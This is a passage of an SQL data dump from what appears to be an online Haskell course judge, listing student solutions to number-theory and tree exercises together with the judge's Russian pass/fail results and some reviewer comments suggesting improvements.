(957, 44, '12206137', '2012-09-23 13:57:06', 0, 'euclid'' 0 d _ _ x2 y2\r\n\n    | d >= 0 = (x2, y2)\r\n\n    | d < 0 = (-x2, -y2)\r\n\n\r\n\neuclid'' a b x1 y1 x2 y2 =\r\n\n    let r = b `div` a in\r\n\n    euclid'' (b - r*a) a (x2 - x1*r) (y2 - y1*r) x1 y1\r\n\n\r\n\neuclid a b = euclid'' a b 1 0 0 1\r\n\n\r\n\ngcd'' 0 d = abs d\r\n\ngcd'' a b = gcd'' (b `mod` a) a\r\n\ngcd'' 0 0 = 0\r\n\n\r\n\n\r\n\nsimplifyList x =\r\n\n    let d = foldl gcd'' 0 x in\r\n\n    if d == 0 then x\r\n\n    else map (`div` d) x\r\n\n\r\n\nmapTuple f (a,b) = (f a, f b)\r\n\n\r\n\nsolve [b,c,d] [k,l,m,n]\r\n\n    | gcd'' b c /= 1 = [0,0,0]\r\n\n    | otherwise =\r\n\n        let (y,z) = mapTuple (* d) $ euclid b c in\r\n\n        let (dy,dz) = (c, -b) in\r\n\n        let [newK, newV, newN] = simplifyList [k, l * c - m * b, n - l*y - m*z] in\r\n\n        if gcd'' newK newV /= 1 then [0,0,0]\r\n\n        else\r\n\n            let (x,dv) = mapTuple (* newN) $ euclid newK newV in\r\n\n            [x, y + dv*dy, z + dv*dz]\r\n\n            \r\n\ndioph [0,b,c,d] x =\r\n\n    solve (simplifyList [b,c,d]) (simplifyList x)\r\n\n\r\n\ndioph [a,b,c,d] [k,l,m,n] =\r\n\n    dioph (zipWith (x y -> x*k - a*y) [a,b,c,d] [k,l,m,n]) [a,b,c,d]\r\n\n    \n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z'),
(958, 44, '12206137', '2012-09-23 14:04:41', 2, '  --- Вообще замечательно, но видимо не совсем все вырожденные случаи рассмотренны, вот такой тест не проходит:\r\n  ---  let [x,y,z] = dioph [0,0,0,0] [0,1,0,3] in y == 3\r\n  --- (Сейчас добавлю его в базу)\r\n  \r\neuclid'' 0 d _ _ x2 y2\r\n\r\n    | d >= 0 = (x2, y2)\r\n\r\n    | d < 0 = (-x2, -y2)\r\n\r\n\r\n\r\neuclid'' a b x1 y1 x2 y2 =\r\n\r\n    let r = b `div` a in\r\n\r\n    euclid'' (b - r*a) a (x2 - x1*r) (y2 - y1*r) x1 y1\r\n\r\n\r\n\r\neuclid a b = euclid'' a b 1 0 0 1\r\n\r\n\r\n\r\ngcd'' 0 d = abs d\r\n\r\ngcd'' a b = gcd'' (b `mod` a) a\r\n\r\ngcd'' 0 0 = 0\r\n\r\n\r\n\r\n\r\n\r\nsimplifyList x =\r\n\r\n    let d = foldl gcd'' 0 x in\r\n\r\n    if d == 0 then x\r\n\r\n    else map (`div` d) x\r\n\r\n\r\n\r\nmapTuple f (a,b) = (f a, f b)\r\n\r\ncheckTriple a b c = gcd'' a b == 1 || (a == 0 && b == 0 && c == 0)\r\n\r\n\r\n\r\nsolve [b,c,d] [k,l,m,n]\r\n\r\n    | not $ checkTriple b c d = [0,0,0]\r\n\r\n    | otherwise =\r\n\r\n        let (y,z) = mapTuple (* d) $ euclid b c in\r\n\r\n        let (dy,dz) = (c, -b) in\r\n\r\n        let [newK, newV, newN] = simplifyList [k, l * c - m * b, n - l*y - m*z] in\r\n\r\n        if not $ checkTriple newK newV newN then [0,0,0]\r\n\r\n        else\r\n\r\n            let (x,dv) = mapTuple (* newN) $ euclid newK newV in\r\n\r\n            [x, y + dv*dy, z + dv*dz]\r\n\r\n            \r\n\r\ndioph [0,b,c,d] x =\r\n\r\n    solve (simplifyList [b,c,d]) (simplifyList x)\r\n\r\n\r\n\r\ndioph [a,b,c,d] [k,l,m,n] =\r\n\r\n    dioph (zipWith (x y -> x*k - a*y) [a,b,c,d] [k,l,m,n]) [a,b,c,d]\r\n\r\n    \r\n', '<br/>Тесты успешно пройдены!'),
(959, 22, '82873297', '2012-09-23 14:14:33', 1, 'g x = any (y->y==x) [y + z | y <- xs, z <- xs, y < z]\r\n\r\n      where xs = primesx x\r\n\r\n\r\n\r\nprimesx x = [y | y <- [2..x], dividers y == [1, y]]\r\n\r\ndividers x = [y | y <- [1..x], mod x y == 0]\r\n   --- ОК, засчитано, но вообще получается что вы, чтобы проверить простоту проверяете все числа от 1 до x\r\n   --- Хотя конечно достаточно проверять до x `div` 2, а если провести простые рассуждения, то и до sqrt x ', '<br/>Тесты успешно пройдены!'),
(960, 23, '383483', '2012-09-23 15:55:32', 1, 'c n = cycl 1 n 0\r\ncycl i n res\r\n   | i == n = res+1\r\n   | otherwise = cycl (i+1) n (res + mcycl 1 n i)\r\nmcycl p n x \r\n      | notvzpr p x = 0\r\n      | x > n = 0\r\n      | x == n = 1\r\n      | otherwise = bcycl (p*x) (x+1) n (n-x) 0\r\nbcycl p s n q t\r\n      | s>=n = t\r\n      | otherwise = bcycl p (s+1) n q (t + mcycl p q s) \r\nnotvzpr x y = nvp 2 x y\r\nnvp i x y\r\n      | (i > x) || (i > y) = False\r\n      | mod x i == 0 && mod y i == 0 = True\r\n      | otherwise = nvp (i+1) x y\r\n             --- Ну или тут можно было использовать алгоритм Евклида', '<br/>Тесты успешно пройдены!'),
(961, 35, '318210', '2012-09-23 16:09:24', 0, 'distance (x1,y1)(x2,y2) = sqrt((x2 - x1) * (x2 - x1) + (y2-y1)*(y2-y1))\r\n\n\r\n\nisosc (x1, y1) (x2, y2) (x3, y3) | ( distance(x1,y1)(x2,y2) + distance(x2,y2)(x3,y3) > distance(x1,y1)(x3,y3) && distance(x1,y1)(x2,y2) == distance(x2,y2)(x3,y3) ) || \r\n\n					( distance(x1,y1)(x2,y2) + distance(x1,y1)(x3,y3) > distance(x3,y3)(x2,y2) && distance(x1,y1)(x2,y2) == distance(x1,y1)(x3,y3)) ||\r\n\n				        ( distance(x2,y2)(x3,y3) + distance(x1,y1)(x3,y3) > distance(x1,y1)(x2,y2) && distance(x2,y2)(x3,y3) == distance(x1,y1)(x3,y3))= True\r\n\n				|otherwise = False\n', 'Выражение имеет неправильное значение: isosc (0, 0) (0, 10) (0, -10)'),
(962, 35, '318210', '2012-09-23 16:12:41', 1, 'distance (x1,y1)(x2,y2) = sqrt((x2 - x1) * (x2 - x1) + (y2-y1)*(y2-y1))\r\n\r\n\r\n\r\nisosc (x1, y1) (x2, y2) (x3, y3) | ( distance(x1,y1)(x2,y2) + distance(x2,y2)(x3,y3) >= distance(x1,y1)(x3,y3) && distance(x1,y1)(x2,y2) == distance(x2,y2)(x3,y3) ) || \r\n\r\n					( distance(x1,y1)(x2,y2) + distance(x1,y1)(x3,y3) >= distance(x3,y3)(x2,y2) && distance(x1,y1)(x2,y2) == distance(x1,y1)(x3,y3)) ||\r\n\r\n				        ( distance(x2,y2)(x3,y3) + distance(x1,y1)(x3,y3) >= distance(x1,y1)(x2,y2) && distance(x2,y2)(x3,y3) == distance(x1,y1)(x3,y3))= True\r\n    --- имело смысл, наверное воспользоваться let, чтобы не переписывать (и не пепесчитывать) distance по много раз.\r\n\r\n				|otherwise = False\r\n', '<br/>Тесты успешно пройдены!'),
(963, 36, '318210', '2012-09-23 17:10:15', 1, 'cubeTable n  = map (x->(x, x*x*x)) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(964, 43, '2118411', '2012-09-23 17:38:45', 0, 'mygcd m n = mygcd2 0 1 1 0 m n\r\nmygcd2 x lastx y lasty m 0 = (lastx, lasty)\r\nmygcd2 x lastx y lasty m n = mygcd2 (lastx - (m `div` n)*x) x (lasty -(m `div` n)*y) y n (rem m n)\r\n', 'Не удалось вычислить выражение "let (x,y) = euclid 3 5 in 3*x+5*y", проверьте правильность синтаксиса'),
(965, 43, '2118411', '2012-09-23 17:39:18', 1, 'euclid m n = mygcd2 0 1 1 0 m n\r\nmygcd2 x lastx y lasty m 0 = (lastx, lasty)\r\nmygcd2 x lastx y lasty m n = mygcd2 (lastx - (m `div` n)*x) x (lasty -(m `div` n)*y) y n (rem m n)\r\n', '<br/>Тесты успешно пройдены!'),
(966, 37, '318210', '2012-09-23 17:49:30', 1, 'minsum [] = error "not enough elements"\r\nminsum [h] = error "not enough elements"\r\nminsum (h : s) = minimum ( zipWith (+) (reverse ( tail (reverse (h : s))) ) s)\r\n\r\n--А как делается по-другому (чисто интересно)?\r\n   --- Ну, например, то же можно записать\r\n   ---   minsum xs = minimum (zipWith (+) xs (tail xs))\r\n   --- А можно еще написать все в foldr, но это сложнее, по моему zipWith лучше ', '<br/>Тесты успешно пройдены!'),
(967, 40, '318210', '2012-09-23 19:36:40', 1, 'frame n = map (x -> if x == 1 || x == n then frame0(n) else frame1(n)) [1..n]\r\n\r\n\r\n\r\nframe0 n = map (x -> 1) [1..n]\r\n\r\nframe1 n = map (x -> if x == 1 || x == n then 1 else 0) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(968, 22, '472848', '2012-09-23 19:54:05', 0, 'f n 1 = True\r\nf n k = (n `mod` k /= 0) && f n (k - 1)\r\nissim 1 = False\r\nissim n = f n (n - 1)\r\nissumsim 0 m = False\r\nissumsim k m = (issim k && issim m) || issumsim (k - 1) (m + 1)\r\ng n = issumsim (n - 1) 1', 'Выражение имеет неправильное значение: g 6'),
(969, 22, '472848', '2012-09-23 19:55:16', 1, 'f n 1 = True\r\nf n k = (n `mod` k /= 0) && f n (k - 1)\r\nissim 1 = False\r\nissim n = f n (n - 1)\r\nissumsim 0 m = False\r\nissumsim k m = (issim k && issim m && k /= m) || issumsim (k - 1) (m + 1)\r\ng n = issumsim (n - 1) 1', '<br/>Тесты успешно пройдены!'),
(970, 41, '318210', '2012-09-23 20:37:11', 1, 'countOdd s = foldr (x y -> if x `mod` 2 == 1 then 1 + y else y) 0 s\r\ncountOdd1 s = length( filter (odd) s)\r\n--А можно как-нибудь без length?\r\n    --- ну например sum . map (`mod`2)', '<br/>Тесты успешно пройдены!'),
(971, 44, '2562137', '2012-09-23 20:39:28', 0, 'euclid a b = \r\n	if (a == 0) then (0, 1)\r\n	else (y - x * (div b a), x)\r\n		where (x, y) = euclid (mod b a) a\r\n\r\nfind_any a b c = \r\n	if (mod c g /= 0) then (0, 0) -- no solution\r\n	else\r\n		if (a < 0)\r\n		then if (b < 0)\r\n			then (- x0 * c / g, - y0 * c / g)\r\n			else (- x0 * c / g, y0 * c / g)\r\n		else if (b < 0)\r\n			then (x0 * c / g, - y0 * c / g)\r\n			else (x0 * c / g, y0 * c / g)\r\n	where\r\n		(x0, y0) = euclid (abs a) (abs b)\r\n		g = gcd (abs a) (abs b)\r\n\r\ndioph [a0, a1, a2, a3] [b0, b1, b2, b3] =\r\n	[x, y, z]\r\n	where\r\n		c0 = a0 * b2 - a2 * b0\r\n		c1 = a1 * b2 - a2 * b1\r\n		c2 = a3 * b2 - a2 * b3\r\n		g = gcd (abs c0) (abs c1)\r\n		(x1, y1) = euclid c0 c1\r\n		d0 = a0 * c1 `div` g - a1 * c0 `div` g\r\n		d1 = a2\r\n		d2 = a3 - a0 * x1 - a1 * y1\r\n		h = gcd (abs d0) (abs d1)\r\n		(k1, z1) = euclid d0 d1\r\n		x = x1 * c2 `div` g + c1 * k1 `div` g + c1 * d1 `div` (g * h) * l\r\n		y = y1 * c2 `div` g - c0 * k1 `div` g - c0 * d1 `div` (g * h) * l\r\n		z = z1 - d0 `div` h * l\r\n		l = 0', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)'),
(972, 42, '318210', '2012-09-23 20:45:10', 1, 'myfoldl _ x [] = x\r\n\r\nmyfoldl f x (h : s) = myfoldl f (f x h) s\r\n', '<br/>Тесты успешно пройдены!'),
(973, 38, '318210', '2012-09-23 21:10:28', 0, 'data Tree = Empty | Node Int Tree Tree\r\n\nheight Empty = 0\r\n\nheight (Node _ t1 t2) = 1 + max (height t1) (height t2)\n', 'Выражение имеет неправильное значение: height (Node 1 Empty Empty)'),
(974, 44, '2562137', '2012-09-23 21:29:39', 0, 'euclid a b = \r\n	if (a == 0) then (0, 1)\r\n	else (y - x * (div b a), x)\r\n		where (x, y) = euclid (mod b a) a\r\n\r\nfind_any a b c = \r\n	if (mod c g /= 0) then (1000000, 1000000) -- no solution\r\n	else\r\n		if (a < 0)\r\n		then if (b < 0)\r\n			then (- x0 * c `div` g, - y0 * c `div` g)\r\n			else (- x0 * c `div` g, y0 * c `div` g)\r\n		else if (b < 0)\r\n			then (x0 * c `div` g, - y0 * c `div` g)\r\n			else (x0 * c `div` g, y0 * c `div` g)\r\n	where\r\n		(x0, y0) = euclid (abs a) (abs b)\r\n		g = gcd (abs a) (abs b)\r\n\r\ndioph [a0, a1, a2, a3] [b0, b1, b2, b3] =\r\n	[x, y, z]\r\n	where\r\n		c0 = a0 * b2 - a2 * b0\r\n		c1 = a1 * b2 - a2 * b1\r\n		c2 = a3 * b2 - a2 * b3\r\n		g = abs(gcd c0 c1)\r\n		(x1, y1) = find_any c0 c1 c2\r\n		d0 = a0 * (c1 `div` g) - a1 * (c0 `div` g)\r\n		d1 = a2\r\n		d2 = a3 - a0 * x1 - a1 * y1\r\n		h = abs(gcd d0 d1)\r\n		(k1, z1) = find_any d0 d1 d2\r\n		x = x1 + k1 * (c1 `div` g) + (c1 `div` g) * (d1 `div` h) * l\r\n		y = y1 - k1 * (c0 `div` g) - (c0 `div` g) * (d1 `div` h) * l\r\n		z = z1 - d0 `div` h * l\r\n		l = 0\r\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z", проверьте правильность синтаксиса'),
(975, 38, '318210', '2012-09-23 21:32:11', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\n\r\n\r\nheight Empty = 0\r\n\r\nheight a = height1 a - 1\r\n\r\nheight1 Empty = 0\r\n\r\nheight1 (Node _ t1 t2) = 1 + max (height1 t1) (height1 t2)\r\n', '<br/>Тесты успешно пройдены!'),
(976, 44, '2562137', '2012-09-23 21:41:12', 0, 'mygcd 0 0 = 1\r\nmygcd a b = gcd a b\r\n\r\neuclid a b = \r\n	if (a == 0) then (0, 1)\r\n	else (y - x * (div b a), x)\r\n		where (x, y) = euclid (mod b a) a\r\n\r\nfind_any a b c = \r\n	if (mod c g /= 0) then (1000000, 1000000) -- no solution\r\n	else\r\n		if (a < 0)\r\n		then if (b < 0)\r\n			then (- x0 * c `div` g, - y0 * c `div` g)\r\n			else (- x0 * c `div` g, y0 * c `div` g)\r\n		else if (b < 0)\r\n			then (x0 * c `div` g, - y0 * c `div` g)\r\n			else (x0 * c `div` g, y0 * c `div` g)\r\n	where\r\n		(x0, y0) = euclid (abs a) (abs b)\r\n		g = mygcd (abs a) (abs b)\r\n\r\ndioph [a0, a1, a2, a3] [b0, b1, b2, b3] =\r\n	[x, y, z]\r\n	where\r\n		c0 = a0 * b2 - a2 * b0\r\n		c1 = a1 * b2 - a2 * b1\r\n		c2 = a3 * b2 - a2 * b3\r\n		g = abs(mygcd c0 c1)\r\n		(x1, y1) = find_any c0 c1 c2\r\n		d0 = a0 * (c1 `div` g) - a1 * (c0 `div` g)\r\n		d1 = a2\r\n		d2 = a3 - a0 * x1 - a1 * y1\r\n		h = abs(mygcd d0 d1)\r\n		(k1, z1) = find_any d0 d1 d2\r\n		x = x1 + k1 * (c1 `div` g) + (c1 `div` g) * (d1 `div` h) * l\r\n		y = y1 - k1 * (c0 `div` g) - (c0 `div` g) * (d1 `div` h) * l\r\n		z = z1 - d0 `div` h * l\r\n		l = 0\r\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [25,33,0,1] [1,0,1,0] in (25*x+33*y, x+z)'),
(977, 44, '2562137', '2012-09-23 21:58:40', 0, 'mygcd 0 0 = 1\r\nmygcd a b = gcd a b\r\n\r\neuclid a b = \r\n	if (a == 0) then (0, 1)\r\n	else (y - x * (div b a), x)\r\n		where (x, y) = euclid (mod b a) a\r\n\r\nfind_any a b c = \r\n	if (mod c g /= 0) then (1000000, 1000000) -- no solution\r\n	else\r\n		if (a < 0)\r\n		then if (b < 0)\r\n			then (- x0 * c `div` g, - y0 * c `div` g)\r\n			else (- x0 * c `div` g, y0 * c `div` g)\r\n		else if (b < 0)\r\n			then (x0 * c `div` g, - y0 * c `div` g)\r\n			else (x0 * c `div` g, y0 * c `div` g)\r\n	where\r\n		(x0, y0) = euclid (abs a) (abs b)\r\n		g = mygcd (abs a) (abs b)\r\n\r\ndioph [a0, a1, a2, a3] [b0, b1, b2, b3] =\r\n	[x, y, z]\r\n	where\r\n		c0 = a0 * b2 - a2 * b0\r\n		c1 = a1 * b2 - a2 * b1\r\n		c2 = a3 * b2 - a2 * b3\r\n		g = abs(mygcd c0 c1)\r\n		(x1, y1) = find_any c0 c1 c2\r\n\r\n		pd0 = a0 * (c1 `div` g) - a1 * (c0 `div` g)\r\n		pd1 = a2\r\n		pd2 = a3 - a0 * x1 - a1 * y1\r\n		qd0 = b0 * (c1 `div` g) - b1 * (c0 `div` g)\r\n		qd1 = b2\r\n		qd2 = b3 - b0 * x1 - b1 * y1\r\n		\r\n		(d0, d1, d2) = if (pd0 == 0 && pd1 == 0) then (qd0, qd1, qd2) else (pd0, pd1, pd2)\r\n\r\n		h = abs(mygcd d0 d1)\r\n		(k1, z1) = find_any d0 d1 d2\r\n		x = x1 + k1 * (c1 `div` g) + (c1 `div` g) * (d1 `div` h) * l\r\n		y = y1 - k1 * (c0 `div` g) - (c0 `div` g) * (d1 `div` h) * l\r\n		z = z1 - d0 `div` h * l\r\n		l = 0\r\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [0,0,0,0] [0,1,0,3] in y'),
(978, 44, '2562137', '2012-09-23 22:25:49', 2, '--- Где-то наверное опечатка - вот так дает неправильные результаты\r\n--- dioph [0,1,0,0] [1,1,0,10]\r\n--- (Сейчас добавлю такой тест)\r\n\r\nmygcd 0 0 = 1\r\nmygcd a b = gcd a b\r\n\r\neuclid a b = \r\n	if (a == 0) then (0, 1)\r\n	else (y - x * (div b a), x)\r\n		where (x, y) = euclid (mod b a) a\r\n\r\nfind_any a b c = \r\n	if (mod c g /= 0) then (1000000, 1000000) -- no solution\r\n	else\r\n		if (a < 0)\r\n		then if (b < 0)\r\n			then (- x0 * c `div` g, - y0 * c `div` g)\r\n			else (- x0 * c `div` g, y0 * c `div` g)\r\n		else if (b < 0)\r\n			then (x0 * c `div` g, - y0 * c `div` g)\r\n			else (x0 * c `div` g, y0 * c `div` g)\r\n	where\r\n		(x0, y0) = euclid (abs a) (abs b)\r\n		g = mygcd (abs a) (abs b)\r\n\r\ndioph [0,0,0,0] list = dioph list [0,0,0,0]\r\n\r\ndioph [a0, a1, a2, a3] [0,0,0,0] = \r\n	[x, y, z]\r\n	where\r\n		c0 = a0\r\n		c1 = a1\r\n		c2 = a3		\r\n\r\n		g = abs(mygcd c0 c1)\r\n		(x1, y1) = find_any c0 c1 c2\r\n\r\n		d0 = a0 * (c1 `div` g) - a1 * (c0 `div` g)\r\n		d1 = a2\r\n		d2 = a3 - a0 * x1 - a1 * y1\r\n		\r\n		h = abs(mygcd d0 d1)\r\n		(k1, z1) = find_any d0 d1 d2\r\n		\r\n		x = x1 + k1 * (c1 `div` g)\r\n		y = y1 - k1 * (c0 `div` g)\r\n		z = z1\r\n\r\ndioph [a0, a1, a2, a3] [b0, b1, b2, b3] =\r\n	[x, y, z]\r\n	where\r\n		c0 = a0 * b2 - a2 * b0\r\n		c1 = a1 * b2 - a2 * b1\r\n		c2 = a3 * b2 - a2 * b3\r\n		\r\n		g = abs(mygcd c0 c1)\r\n		(x1, y1) = find_any c0 c1 c2\r\n\r\n		pd0 = a0 * (c1 `div` g) - a1 * (c0 `div` g)\r\n		pd1 = a2\r\n		pd2 = a3 - a0 * x1 - a1 * y1\r\n		qd0 = b0 * (c1 `div` g) - b1 * (c0 `div` g)\r\n		qd1 = b2\r\n		qd2 = b3 - b0 * x1 - b1 * y1\r\n\r\n		takeSecond = pd0 == 0 && pd1 == 0\r\n		\r\n		(d0, d1, d2) = if takeSecond then (qd0, qd1, qd2) else (pd0, pd1, pd2)\r\n\r\n		h = abs(mygcd d0 d1)\r\n		(k1, z1) = find_any d0 d1 d2\r\n\r\n		x = x1 + k1 * (c1 `div` g)\r\n		y = y1 - k1 * (c0 `div` g)\r\n		z = z1', '<br/>Тесты успешно пройдены!'),
(979, 43, '318210', '2012-09-23 23:20:22', 0, '', 'Не удалось вычислить выражение "let (x,y) = euclid 3 5 in 3*x+5*y", проверьте правильность синтаксиса'),
(980, 43, '318210', '2012-09-23 23:20:41', 0, 'euclid a b = euclid2 a b 0\r\n\neuclid2 a b s| a < b = euclid2 b a 1\r\n\n		| b < 0 = error "wrong argument"\r\n\n\r\n\neuclid2 a b k| b == 1 = (1, -a + 1)\r\n\n	|otherwise =  euclid1 b (a `mod` b) 1 0 (- a `div` b) 1 k\r\n\n\r\n\n\r\n\n\r\n\neuclid1 a b d e f g k| b == 1 && k == 1 = (f, d)\r\n\n			| b==1 && k == 0 = (d, f)\r\n\n				|otherwise = euclid1 b (a `mod` b) (e + d * ( - a `div` b)) d \r\n\n					(g + f * ( - a `div` b)) f k\n', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(981, 43, '318210', '2012-09-24 00:10:43', 1, 'euclid a b = euclid2 a b 0\r\n\r\neuclid2 a b s| a < b = euclid2 b a 1\r\n\r\n		| (b == 0 && abs(a) /= 1) || (a == 0 && abs(b) /= 1) = error "wrong argument"\r\n\r\n	--	| b < 0 = error "wrong argument"\r\n\r\n\r\n\r\neuclid2 a b k| b == 1 = (1, -a + 1)\r\n\r\n	| (a == 1 && b == 0 && k == 0) = (1, 0)\r\n\r\n	| (a == 1 && b == 0 && k == 1) = (0, 1)\r\n\r\n	| (a == 0 && b == -1 && k == 0) = (0, -1)\r\n\r\n	| (a == 0 && b == -1 && k == 1) = (-1, 0)\r\n\r\n	|b > 0 =  euclid1 b (a `mod` b) 1 0 (- a `div` b) 1 k\r\n\r\n	| b < 0  = euclid3 b (a `mod` b) 1 0 (- a `div` b) 1 k\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\neuclid1 a b d e f g k| b == 1 && k == 1 = (f, d)\r\n\r\n			| b == 1 && k == 0 = (d, f)\r\n\r\n				|otherwise = euclid1 b (a `mod` b) (e + d * ( - a `div` b)) d \r\n\r\n					(g + f * ( - a `div` b)) f k\r\n\r\n\r\n\r\neuclid3 a b d e f g k | b == -1 && k == 1 = (-f, -d)\r\n\r\n			| b == -1 && k == 0 = (-d, -f)\r\n\r\n				|otherwise = euclid3 b (a `mod` b) (e + d * ( - a `div` b)) d \r\n\r\n					(g + f * ( - a `div` b)) f k\r\n', '<br/>Тесты успешно пройдены!'),
(982, 41, 'tonyo', '2012-09-24 07:00:32', 1, 'countOdd list = foldl (y x-> if odd x then y+1 else y) 0 list\r\ncountOdd1 list = sum $ map (x-> if odd x then 1 else 0) list\r\n', '<br/>Тесты успешно пройдены!'),
(983, 38, 'tonyo', '2012-09-24 07:08:48', 1, 'data Node = Node Integer Node Node | Empty\r\n\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ lc Empty) = 1 + height lc\r\nheight (Node _ Empty rc) = 1 + height rc\r\nheight (Node _ lc rc) = 1 + maximum [height lc, height rc]\r\n   --- или 1 + max height lc height rc', '<br/>Тесты успешно пройдены!'),
(984, 39, 'tonyo', '2012-09-24 08:07:58', 1, 'data Node = Node Integer Node Node | Empty\r\n\r\nminHeight root = minHeight1 [ (root, 0) ] []\r\n\r\n-- я хотел реализовать обход дерева в ширину, но так как эффективную\r\n-- очередь сделать оказалось трудно, реализовал хранение двух уровней дерева\r\n\r\n   --- ОК, очень хорошо! Одно предложение по усовершенствованию, мне кажется нет смысла хранить\r\n   --- уровень для каждой вершины. Можно хранить уровень для всего списка, там же все вершины одного уровня,\r\n   --- или просто как еще один параметр\r\n\r\nminHeight1 [] nextlevel = minHeight1 nextlevel []\r\nminHeight1 ( (node, height):nodelist ) nextlevel\r\n    | isLeaf node = height\r\n    | isEmpty (leftChild node) = minHeight1 nodelist ((rightChild node, height+1):nextlevel)\r\n    | isEmpty (rightChild node) = minHeight1 nodelist ((leftChild node, height+1):nextlevel)\r\n    | otherwise = minHeight1 nodelist ((leftChild node, height+1):(rightChild node, height+1):nextlevel)\r\n\r\nisLeaf (Node _ Empty Empty) = True\r\nisLeaf _ = False\r\n\r\nleftChild (Node _ lc rc) = lc\r\nrightChild (Node _ lc rc) = rc\r\n\r\nisEmpty Empty = True\r\nisEmpty _ = False\r\n', '<br/>Тесты успешно пройдены!'),
(985, 44, '12206137', '2012-09-24 08:21:49', 1, '(|>) x f = f x\r\n\r\n\r\n\r\neuclid'' 0 d _ _ x2 y2\r\n\r\n    | d >= 0 = (x2, y2)\r\n\r\n    | d < 0 = (-x2, -y2)\r\n\r\n\r\n\r\neuclid'' a b x1 y1 x2 y2 =\r\n\r\n    let r = b `div` a in\r\n\r\n    euclid'' (b - r*a) a (x2 - x1*r) (y2 - y1*r) x1 y1\r\n\r\n\r\n\r\neuclid a b = euclid'' a b 1 0 0 1\r\n\r\n\r\n\r\ngcd'' 0 d = abs d\r\n\r\ngcd'' a b = gcd'' (b `mod` a) a\r\n\r\ngcd'' 0 0 = 0\r\n\r\n\r\n\r\nlistGcd x = foldl gcd'' 0 x\r\n\r\n\r\n\r\nsimplifyList x =\r\n\r\n    let d = listGcd x in\r\n\r\n    if d == 0 then x\r\n\r\n    else map (`div` d) x\r\n\r\n\r\n\r\nmapTuple f (a,b) = (f a, f b)\r\n\r\ncheckTriple a b c = gcd'' a b == 1 || (a == 0 && b == 0 && c == 0)\r\n\r\n\r\n\r\ndefaultVal = [0,0,0]\r\n\r\n\r\n\r\nfind f (x:xs) = if f x then x else find f xs\r\n\r\n\r\n\r\nsolve [0,0,0] [0,0,0,0] = [0,0,0]\r\n\r\nsolve [0,0,0] [k,l,m,n]\r\n\r\n    | listGcd [k,l,m] /= 1 = defaultVal\r\n\r\n    | otherwise =\r\n\r\n        [(k,l, ((x,y) -> [x,y,0])),\r\n\r\n         (l,m, ((x,y) -> [0,x,y])),\r\n\r\n         (m,k, ((x,y) -> [y,0,x]))]\r\n\r\n        |> find ((x,y,_) -> gcd x y == 1)\r\n\r\n        |> ((x,y,f) -> f $ mapTuple (* n) $ euclid x y)\r\n\r\nsolve [b,c,d] [k,l,m,n]\r\n\r\n    | not $ checkTriple b c d = defaultVal\r\n\r\n    | otherwise =\r\n\r\n        let (y,z) = mapTuple (* d) $ euclid b c in\r\n\r\n        let (dy,dz) = (c, -b) in\r\n\r\n        let [newK, newV, newN] = simplifyList [k, l * c - m * b, n - l*y - m*z] in\r\n\r\n        if not $ checkTriple newK newV newN then defaultVal\r\n\r\n        else\r\n\r\n            let (x,dv) = mapTuple (* newN) $ euclid newK newV in\r\n\r\n            [x, y + dv*dy, z + dv*dz]\r\n\r\n            \r\n\r\ndioph [0,b,c,d] x =\r\n\r\n    solve (simplifyList [b,c,d]) (simplifyList x)\r\n\r\n\r\n\r\ndioph [a,b,c,d] [k,l,m,n] =\r\n\r\n    dioph (zipWith (x y -> x*k - a*y) [a,b,c,d] [k,l,m,n]) [a,b,c,d]\r\n\r\n    \r\n', '<br/>Тесты успешно пройдены!'),
(986, 31, '517309', '2012-09-24 09:38:22', 2, 'import Debug.Trace\r\n\r\n\r\n\r\n\r\n\r\ndata Tree = Node Integer Tree Tree | Empty\r\n\r\n\r\n\r\nminHeight Empty = 0\r\n\r\nminHeight t = minNodes t - 1\r\n\r\n\r\n\r\nminNodes Empty = 0\r\n\r\nminNodes (Node key left right) = do\r\n\r\n	let leftHeight = minNodes left\r\n\r\n	if leftHeight > 1 then 1 + (min leftHeight (minNodes right)) else 1 + leftHeight\r\n', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(987, 31, 'Deutsche', '2012-09-24 09:56:29', 1, 'This problem was sent by email, accept it please', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(988, 31, '2118411', '2012-09-24 12:50:50', 1, 'parts2 (xs)\r\n\r\n        | (r == 0) = parts2r m m 0 0 n (xs)\r\n\r\n        | otherwise = False\r\n\r\n        where\r\n\r\n                l = length xs\r\n\r\n                n = l `div` 2\r\n\r\n                r = l `mod` 2\r\n\r\n                m = (minimum xs) - 1\r\n\r\n\r\n\r\nparts2r a b ac bc n []\r\n\r\n                        | (ac == bc) = True\r\n\r\n                        | otherwise = False\r\n\r\nparts2r a b ac bc n (x:xs)\r\n\r\n                        | (x <= b && x > a && ac < n) = parts2r  x b (ac+1) bc n xs\r\n\r\n                        | (x > b && x <= a && bc < n) = parts2r  a x ac (bc+1) n xs\r\n\r\n                        | (ac < n && bc < n && x > a && x > b) = (parts2r x b (ac+1) bc n xs) || (parts2r a x ac (bc+1) n xs)\r\n\r\n                        | (ac < n && x > a) = parts2r x b (ac+1) bc n xs\r\n\r\n                        | (bc < n && x > b) = parts2r a x ac (bc+1) n xs\r\n\r\n                        | otherwise = False\r\n', '<br/>Тесты успешно пройдены!'),
